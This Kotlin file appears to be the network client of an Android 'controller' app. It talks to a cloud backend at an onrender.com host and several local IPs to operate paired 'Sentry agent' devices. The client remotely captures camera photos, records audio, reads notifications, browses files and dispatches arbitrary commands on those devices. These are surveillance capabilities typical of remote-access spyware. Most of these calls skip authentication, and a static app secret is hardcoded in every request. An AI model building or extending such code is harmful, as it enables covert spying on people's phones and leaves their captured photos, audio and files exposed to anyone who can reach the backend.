package com.example.kinetix.network

import android.content.Context
import android.os.Build
import com.example.kinetix.crypto.CryptoManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * KinetixApiClient handles HTTP REST communication with the Cloud Backend.
 * Implements public-key challenge-response authentication with zero passwords.
 */
class KinetixApiClient(
    private val context: Context,
    private var baseUrl: String = "https://sentry-f502.onrender.com/api/v1"
) {
    private var sessionToken: String? = null
    private val candidateBaseUrls = listOf(
        "https://sentry-f502.onrender.com/api/v1",
        "http://192.168.1.108:4000/api/v1",
        "http://192.168.1.124:4000/api/v1",
        "http://127.0.0.1:4000/api/v1",
        "http://10.0.2.2:4000/api/v1"
    )

    fun setBaseUrl(url: String) {
        this.baseUrl = url
    }

    /**
     * Register or update controller identity on the backend
     */
    suspend fun registerDevice(): Result<JSONObject> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val publicKeyPem = CryptoManager.getPublicKeyPem()

        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL} (Controller)")
            put("platform", "Android")
            put("osVersion", "Android ${Build.VERSION.RELEASE}")
            put("appVersion", "1.0.0")
            put("publicKey", publicKeyPem)
        }

        post("/devices/register", body, authenticated = false)
    }

    /**
     * Perform public-key challenge-response authentication to obtain JWT session token
     */
    suspend fun authenticate(): Result<String> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)

        // 1. Request challenge nonce
        val challengeReq = JSONObject().apply { put("deviceId", deviceId) }
        val challengeRes = post("/auth/challenge", challengeReq, authenticated = false)
            .getOrElse { return@withContext Result.failure(it) }

        val challenge = challengeRes.getJSONObject("challenge")
        val challengeId = challenge.getString("challengeId")
        val nonce = challenge.getString("nonce")

        // 2. Sign nonce using hardware-backed private key
        val signature = CryptoManager.signPayload(nonce)

        // 3. Verify signature and obtain JWT
        val verifyReq = JSONObject().apply {
            put("challengeId", challengeId)
            put("deviceId", deviceId)
            put("signature", signature)
        }

        val verifyRes = post("/auth/verify", verifyReq, authenticated = false)
            .getOrElse { return@withContext Result.failure(it) }

        val token = verifyRes.getString("token")
        sessionToken = token
        Result.success(token)
    }

    /**
     * Discover available Sentry agents for pairing
     */
    suspend fun listAvailableDevices(): Result<JSONArray> = withContext(Dispatchers.IO) {
        val res = request("GET", "/devices", null, authenticated = false)
        res.map { it.getJSONArray("devices") }
    }

    suspend fun getNotifications(deviceId: String): Result<JSONArray> = withContext(Dispatchers.IO) {
        val res = request("GET", "/devices/$deviceId/notifications", null, authenticated = false)
        res.map { it.getJSONArray("notifications") }
    }

    suspend fun clearNotifications(deviceId: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        request("DELETE", "/devices/$deviceId/notifications", null, authenticated = false)
    }

    suspend fun getPhotos(deviceId: String): Result<JSONArray> = withContext(Dispatchers.IO) {
        val res = request("GET", "/photos/list/$deviceId", null, authenticated = false)
        res.map { it.getJSONArray("photos") }
    }

    suspend fun capturePhoto(deviceId: String, camera: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("camera", camera)
        }
        request("POST", "/photos/capture", body.toString(), authenticated = false)
    }

    suspend fun triggerAudioRecord(deviceId: String, durationSeconds: Int = 10): Result<JSONObject> = withContext(Dispatchers.IO) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("durationSeconds", durationSeconds)
        }
        request("POST", "/audio/record", body.toString(), authenticated = false)
    }

    suspend fun getAudioList(deviceId: String): Result<JSONArray> = withContext(Dispatchers.IO) {
        val res = request("GET", "/audio/list/$deviceId", null, authenticated = false)
        res.map { it.getJSONArray("audioList") }
    }

    suspend fun getBatteryTelemetry(deviceId: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        val res = request("GET", "/battery/$deviceId", null, authenticated = false)
        res.map { it.getJSONObject("telemetry") }
    }

    suspend fun getFileList(deviceId: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        request("GET", "/files/list/$deviceId", null, authenticated = false)
    }

    suspend fun exploreFolder(deviceId: String, path: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("path", path)
        }
        request("POST", "/files/explore", body.toString(), authenticated = false)
    }

    suspend fun startPairing(agentDeviceId: string): Result<JSONObject> = withContext(Dispatchers.IO) {
        val controllerDeviceId = CryptoManager.getOrCreateDeviceId(context)
        val body = JSONObject().apply {
            put("controllerDeviceId", controllerDeviceId)
            put("agentDeviceId", agentDeviceId)
        }
        val res = post("/pairing/start", body)
        res.map { it.getJSONObject("session") }
    }

    suspend fun listPairings(): Result<JSONArray> = withContext(Dispatchers.IO) {
        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val res = get("/pairings?deviceId=$deviceId")
        res.map { it.getJSONArray("pairings") }
    }

    suspend fun unpairDevice(pairingId: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        delete("/pairings/$pairingId")
    }

    suspend fun dispatchCommand(
        pairingId: String,
        commandType: String,
        payload: JSONObject = JSONObject()
    ): Result<JSONObject> = withContext(Dispatchers.IO) {
        val nonce = java.util.UUID.randomUUID().toString().replace("-", "")
        val body = JSONObject().apply {
            put("pairingId", pairingId)
            put("commandType", commandType)
            put("payload", payload)
            put("nonce", nonce)
            put("timestamp", System.currentTimeMillis())
        }
        val res = post("/commands", body)
        res.map { it.getJSONObject("command") }
    }

    private fun get(endpoint: String, authenticated: Boolean = false): Result<JSONObject> {
        return request("GET", endpoint, null, authenticated)
    }

    private fun post(endpoint: String, body: JSONObject, authenticated: Boolean = true): Result<JSONObject> {
        return request("POST", endpoint, body.toString(), authenticated)
    }

    private fun delete(endpoint: String): Result<JSONObject> {
        return request("DELETE", endpoint, null, authenticated = true)
    }

    private fun request(
        method: String,
        endpoint: String,
        body: String?,
        authenticated: Boolean
    ): Result<JSONObject> {
        val urlsToTry = if (endpoint.startsWith("http")) listOf(endpoint) else candidateBaseUrls.map { "$it$endpoint" }

        for (fullUrl in urlsToTry) {
            try {
                val conn = URL(fullUrl).openConnection() as HttpURLConnection
                conn.requestMethod = method
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                conn.setRequestProperty("X-App-Secret", "SECURE_CLUSTER_V2_99A8F74B")

                if (authenticated && sessionToken != null) {
                    conn.setRequestProperty("Authorization", "Bearer $sessionToken")
                }

                if (body != null && (method == "POST" || method == "PUT" || method == "PATCH")) {
                    conn.doOutput = true
                    OutputStreamWriter(conn.outputStream, "UTF-8").use { it.write(body) }
                }

                val responseCode = conn.responseCode
                val stream = if (responseCode in 200..299) conn.inputStream else conn.errorStream
                val responseText = BufferedReader(InputStreamReader(stream, "UTF-8")).use { it.readText() }

                if (responseCode in 200..299) {
                    return Result.success(if (responseText.isNotBlank()) JSONObject(responseText) else JSONObject())
                }
            } catch (_: Exception) {
                // Try next candidate URL
            }
        }
        return Result.failure(Exception("Could not connect to backend server"))
    }
}
typealias string = String
